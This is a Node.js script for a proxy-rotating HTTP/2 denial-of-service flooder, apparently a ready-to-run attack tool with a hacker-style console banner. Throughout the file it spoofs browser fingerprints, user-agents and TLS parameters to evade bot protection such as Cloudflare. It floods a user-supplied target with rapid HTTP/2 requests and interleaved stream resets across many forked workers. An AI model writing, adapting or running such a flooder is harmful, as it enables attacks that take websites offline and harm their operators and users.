const net = require("net");
const http2 = require("http2");
const http = require('http');
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const dns = require('dns');
const fetch = require('node-fetch');
const util = require('util');
const socks = require('socks').SocksClient;
const crypto = require("crypto");
const HPACK = require('hpack');
const fs = require("fs");
const os = require("os");
const pLimit = require('p-limit');
const v8 = require('v8');
const colors = require("colors");
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}
function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}


function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
    
  function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
  function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
 const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
 const randomStringArray = Array.from({ length }, () => {
   const randomIndex = Math.floor(Math.random() * characters.length);
   return characters[randomIndex];
 });

 return randomStringArray.join('');
}

const shuffleObject = (obj) => {
                const keys = Object.keys(obj);
                for (let i = keys.length - 1; i > 0; i--) {
                    const j = Math.floor(Math.random() * (i + 1));
                    [keys[i], keys[j]] = [keys[j], keys[i]];
                }
                const shuffledObj = {};
                keys.forEach(key => shuffledObj[key] = obj[key]);
                return shuffledObj;
            };
 function randnum(minLength, maxLength) {
    const characters = '0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({
      length
    }, () => {
      const randomIndex = Math.floor(Math.random() * characters.length);
      return characters[randomIndex];
    });
    return randomStringArray.join('');
  }
    const cplist = [
       "TLS_AES_128_CCM_8_SHA256",
  "TLS_AES_128_CCM_SHA256",
  "TLS_CHACHA20_POLY1305_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_AES_128_GCM_SHA256"
 ];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 const sigalgs = [
     "ecdsa_secp256r1_sha256",
          "rsa_pss_rsae_sha256",
          "rsa_pkcs1_sha256",
          "ecdsa_secp384r1_sha384",
          "rsa_pss_rsae_sha384",
          "rsa_pkcs1_sha384",
          "rsa_pss_rsae_sha512",
          "rsa_pkcs1_sha512"
] 
  let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.SSL_OP_NO_TLSv1_3 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt `); process.exit();}
 const secureProtocol = "TLS_method";
 const headers = {};
 
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 
 const secureContext = tls.createSecureContext(secureContextOptions);
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6],
 }
 
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target); 
 class NetSocket {
     constructor(){}
 
     async SOCKS5(options, callback) {

      const address = options.address.split(':');
      socks.createConnection({
        proxy: {
          host: options.host,
          port: options.port,
          type: 5
        },
        command: 'connect',
        destination: {
          host: address[0],
          port: +address[1]
        }
      }, (error, info) => {
        if (error) {
          return callback(undefined, error);
        } else {
          return callback(info.socket, undefined);
        }
      });
     }
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     
     const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\n` +
     `Host: ${options.address}:443\r\n` +
     `Proxy-Connection: Keep-Alive\r\n\r\n`;
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
        host: options.host,
        port: options.port,
    });

    connection.setTimeout(options.timeout * 100000);
    connection.setKeepAlive(true, 100000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}


 const Socker = new NetSocket();
 
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }


 const lookupPromise = util.promisify(dns.lookup);
let val;
let isp;
let pro;

async function getIPAndISP(url) {
    try {
        const { address } = await lookupPromise(url);
        const apiUrl = `http://ip-api.com/json/${address}`;
        const response = await fetch(apiUrl);
        if (response.ok) {
            const data = await response.json();
            isp = data.isp;
            console.log('ISP FOUND ', url, ':', isp);
        } else {
            return;
        }
    } catch (error) {
        return;
    }
}

const targetURL = parsedTarget.host;

getIPAndISP(targetURL);
const MAX_RAM_PERCENTAGE = 90;
const RESTART_DELAY = 10;


if (cluster.isMaster) {
    console.clear();
    console.log('HEAP SIZE:',v8.getHeapStatistics().heap_size_limit/(1024*1024))
    console.log(`@SENDMEMORESERVER`.bgRed), console.log(`[!] CRISXTOP`);
    console.log(`--------------------------------------------`.gray);
    console.log(`Target: `.red + process.argv[2].white);
    console.log(`Time: `.red + process.argv[3].white);
    console.log(`Rate: `.red + process.argv[4].white);
    console.log(`Thread: `.red + process.argv[5].white);
    console.log(`ProxyFile: `.red + process.argv[6].white);
    console.log(`--------------------------------------------`.gray);
    console.log(`Note: Only work on http/2 or http/1.1 `.brightCyan);

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };

    setInterval(handleRAMUsage, 5000);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(function() {
        runFlooder()
      }, 1);
    
  
    
  }
  function runFlooder() {
const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
function randstr(length) {
    const characters = "0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
};
function taoDoiTuongNgauNhien() {
    const doiTuong = {};
    function getRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }
  maxi = getRandomNumber(2,3)
    for (let i = 1; i <=maxi ; i++) {
      
      
  
   const key = 'cf-sec-'+ generateRandomString(1,9)
  
      const value =  generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)
  
      doiTuong[key] = value;
    }
  
    return doiTuong;
  }
  function eko(minLength, maxLength) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({
    length
  }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });
  return randomStringArray.join('-');
}
nodeii = getRandomInt(122,128)

    const userAgent =`${generateRandomString(100, 400)}Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${nodeii}.0.0.0 Safari/537.36${getRandomInt(100, 99999)}`
     cache = ["no-cache", "no-store", "no-transform", "only-if-cached", "max-age=0", "must-revalidate", "public", "private", "proxy-revalidate", "s-maxage=86400"];
    const headers = {
    ":method": "GET",
    ":authority": parsedTarget.host,
    ":scheme": "https",
    ":path": parsedTarget.path,
    ...shuffleObject({
    "sec-ch-ua": `"Not)B;Brand";v="${getRandomInt(100, 99999)}", "Google Chrome";v="${nodeii}", "Chromium";v="${nodeii}"`,
    "sec-fetch-site": "none",
    ...(Math.random() < 0.4 ? { "cache-control": cache } : {}),
    ...(Math.random() < 0.8 ? { "sec-ch-ua-mobile": "?0"} : {}),
    ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
    ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
    ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br, cdnfly",
    "sec-ch-ua-platform": "Brand-Windows-" + generateRandomString(5, 30) + "=" + generateRandomString(0,2),
     }),
     "user-agent": userAgent,
    "upgrade-insecure-requests": "1",
    "accept-language": "ru,en-US;q=0.9,en;q=0.8"
}
if( Math.random >= 0.5) {
  headers = {
      ...(Math.random() < 0.6 ?{["Junk-size-Selfish"+generateRandomString(1, 2)]: "zefr-"+generateRandomString(1, 2)}:{}),
      ...(Math.random() < 0.6 ?{["HTTP-requests-with-unusual-HTTP-headers-or-URI-path"]: "RIFSK-"+generateRandomString(1, 2)}:{}),
      ...(Math.random() < 0.3 ?{["Request-Coming-From-Known-bad-source" ]: "user-"+generateRandomString(1, 2)}:{}),
      ...(Math.random() < 0.3 ?{["HTTP-requests-from-known-botnet"]: "zefr-"+generateRandomString(1, 2)}:{}),
      ...(Math.random() < 0.3 ?{["RiskKILDNN-"+generateRandomString(1, 2)]: "RIFSK-"+generateRandomString(1, 2)}:{}),
  }
  }
function getWeightedRandom() {
    const randomValue = Math.random() * Math.random();
    return randomValue < 0.25;
}
                        
                        
                      

const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
    address: `${parsedTarget.host}:443`,
    timeout: 10
};

Socker.HTTP(proxyOptions, async (connection, error) => {
    if (error) return;
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true);

    const settings = {
        initialWindowSize: 15663105,
    };

    const tlsOptions = {
        secure: true,
        ALPNProtocols: ["h2", "http/1.1"],
        ciphers: cipper,
        requestCert: true,
        sigalgs: sigalgs,
        socket: connection,
        ecdhCurve: ecdhCurve,
        secureContext: secureContext,
        honorCipherOrder: false,
        rejectUnauthorized: false,
        secureProtocol: Math.random() < 0.5 ? 'TLSv1_3_method' : 'TLSv1_2_method',
        secureOptions: secureOptions,
        host: parsedTarget.host,
        servername: parsedTarget.host,
    };
    
    const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions, () => {
    const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
    tlsSocket.allowHalfOpen = true;
    tlsSocket.setNoDelay(true);
    tlsSocket.setKeepAlive(true, 60000);
    tlsSocket.setMaxListeners(0);

});

function generateJA3Fingerprint(socket) {
    const cipherInfo = socket.getCipher();
    const supportedVersions = socket.getProtocol();

    if (!cipherInfo) {
        console.error('Cipher info is not available. TLS handshake may not have completed.');
        return null;
    }

    const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;

    const md5Hash = crypto.createHash('md5');
    md5Hash.update(ja3String);

    return md5Hash.digest('hex');
}

tlsSocket.on('connect', () => {
    const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
});


    let clasq = shuffleObject({
        ...(Math.random() < 0.5 ? { [getRandomInt(100, 99999)]: getRandomInt(100, 99999) } : {}),
        ...(Math.random() < 0.5 ? { [getRandomInt(100, 99999)]: getRandomInt(100, 99999) } : {}),
        ...(Math.random() < 0.5 ? { headerTableSize: 65536 } : {}),
        enablePush: false,
        enableConnectProtocol: false,
        ...(Math.random() < 0.5 ? { maxConcurrentStreams: 1000 } : {}),
        ...(Math.random() < 0.5 ? { initialWindowSize: 6291456 } : {}),
        ...(Math.random() < 0.5 ? { maxHeaderListSize: 262144 } : {}),
        ...(Math.random() < 0.5 ? { maxFrameSize: 16384 } : {})
    });
function incrementClasqValues() {
    if (clasq.headerTableSize) clasq.headerTableSize += 1;
    if (clasq.maxConcurrentStreams) clasq.maxConcurrentStreams += 1;
    if (clasq.initialWindowSize) clasq.initialWindowSize += 1;
    if (clasq.maxHeaderListSize) clasq.maxHeaderListSize += 1;
    if (clasq.maxFrameSize) clasq.maxFrameSize += 1;
}
setInterval(function() {
        incrementClasqValues()
      }, 1);

    
    let hpack = new HPACK();
    hpack.setTableSize(65535);
    let client;
    
    const clients = [];
    client = http2.connect(parsedTarget.href, {
        protocol: "https",
        createConnection: () => tlsSocket,
        "unknownProtocolTimeout": 10,
        "maxReservedRemoteStreams": 3000,
        "maxSessionMemory": 250,
        settings : clasq,
        socket: tlsSocket,
    });
    clients.push(client);
    client.setMaxListeners(0);
    
    const updateWindow = Buffer.alloc(8);
    updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 65535)) + 65535, 0);
    client.on('remoteSettings', (settings) => {
        const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 65535)) + 65535;
        client.setLocalWindowSize(localWindowSize, 0);
    });
    client.on('connect', () => {
    client.ping((err, duration, payload) => {
    });
});

    clients.forEach(client => {
    const intervalId = setInterval(() => {
        const sendRequests = async () => {
            const randomItem = (array) => array[Math.floor(Math.random() * array.length)];
            
            
            
            
            const limit = pLimit(10);
            let currenthead = 0;

const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('');





                         const updateHeaders = () => {
                          currenthead += 1
			                    if (currenthead == 1) {
                            headers["sec-ch-ua"] = `${randomString}`;
                        } else if (currenthead == 2) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = `${randomString}`;
                        } else if (currenthead == 3) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `${randomString}`;
                        } else if (currenthead == 4) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = `${randomString}`;
                        } else if (currenthead === 5) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = "1";
                        } else if (currenthead === 6) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = "1";
                            headers["accept"] = `${randomString}`;
                        } else if (currenthead === 7) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = "1";
                            headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                            headers["sec-fetch-site"] = `${randomString}`;
                        } else if (currenthead === 8) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = "1";
                            headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                            headers["sec-fetch-site"] = "none";
                            headers["sec-fetch-mode"] = `${randomString}`;
                        } else if (currenthead === 9) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = "1";
                            headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                            headers["sec-fetch-site"] = "none";
                            headers["sec-fetch-mode"] = "navigate";
                            headers["sec-fetch-user"] = `${randomString}`;
                        } else if (currenthead === 10) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = "1";
                            headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                            headers["sec-fetch-site"] = "none";
                            headers["sec-fetch-mode"] = "navigate";
                            headers["sec-fetch-user"] = "?1";
                            headers["sec-fetch-dest"] = `${randomString}`;
                        } else if (currenthead === 11) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = "1";
                            headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                            headers["sec-fetch-site"] = "none";
                            headers["sec-fetch-mode"] = "navigate";
                            headers["sec-fetch-user"] = "?1";
                            headers["sec-fetch-dest"] = "document";
                            headers["accept-encoding"] = `${randomString}`;
                        } else if (currenthead === 12) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = "1";
                            headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                            headers["sec-fetch-site"] = "none";
                            headers["sec-fetch-mode"] = "navigate";
                            headers["sec-fetch-user"] = "?1";
                            headers["sec-fetch-dest"] = "document";
                            headers["accept-encoding"] = "gzip, deflate, br, zstd";
                            currenthead = 0;
                        }
                        };
            let dynHeaders = shuffleObject({
                    ...taoDoiTuongNgauNhien(),
                    ...taoDoiTuongNgauNhien(),
                });
                const head = {
                    ...dynHeaders,
                    ...headers,
                };

            

            
            const requests = [];
            let count = 0;

            

            
            
                            const increaseRequestRate = async (client, dynHeaders, args) => {
                                if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                                    const requests = []; // Luu tr? t?t c? các promise c?a request
                            
                                    for (let i = 0; i < args.Rate; i++) {
                                    updateHeaders();
                                        const requestPromise = limit(() => new Promise((resolve, reject) => {
                                            const req = client.request(head, {
                                                weight: 256,
                                                parent:0,
                                                exclusive: true,
						                                    endStream: true,
                                                depends_on: 0,
                                               
                                            });
                            
                                            req.on('response', (response) => {
                                                req.close(http2.constants.NO_ERROR);
                                                req.destroy();
                                                resolve();
                                            });
                            
                                            req.on('end', () => {
                                                count++;
                                                if (count === args.time * args.Rate) {
                                                    clearInterval(intervalId);
                                                    client.close(http2.constants.NGHTTP2_CANCEL);
                                                    client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('NATRAL'));
                                                } else if (count === args.Rate) {
                                                    client.close(http2.constants.NGHTTP2_CANCEL);
                                                    client.destroy();
                                                    clearInterval(intervalId);
                                                }
                                                reject(new Error('Request timed out'));
                                            });
                            
                                            req.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
                                        }));
                            
                                        const packed = Buffer.concat([
                                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                                            hpack.encode(head)
                                        ]);
                            
                                        let streamId = 1;
                                         let streamIdReset = 0;
                                         const flags = 0x1 | 0x4 | 0x8 | 0x20;
                                         const encodedFrame = encodeFrame(streamId, 1, packed, flags);
                                        const frame = Buffer.concat([encodedFrame]);
                            
                                        if (streamIdReset >= 5 && (streamIdReset - 5) % 10 === 0) {
                                            tlsSocket.write(Buffer.concat([
                                                encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0),
                                                frame
                                                
                                                
                                            ]));
                                        } else if (streamIdReset >= 2 && (streamIdReset -2) % 4 === 0) {
                                        tlsSocket.write(Buffer.concat([encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0)
                            
                                        ]));
                            } 
                                        streamIdReset+= 2;
                                        streamId += 2;
                                        requests.push({ requestPromise, frame , currenthead });
                                    }
                            
                                    await Promise.all(requests.map(({ requestPromise }) => requestPromise));
                                }
                            }
                            await increaseRequestRate(client, head, args);
                        }
                            sendRequests();
                    }, 500);
                });
    
        client.on("close", () => {
            client.destroy();
            tlsSocket.destroy();
            connection.destroy();
            return runFlooder();
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return runFlooder();
        });
        });
    }
const StopScript = () => process.exit(1);
setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});

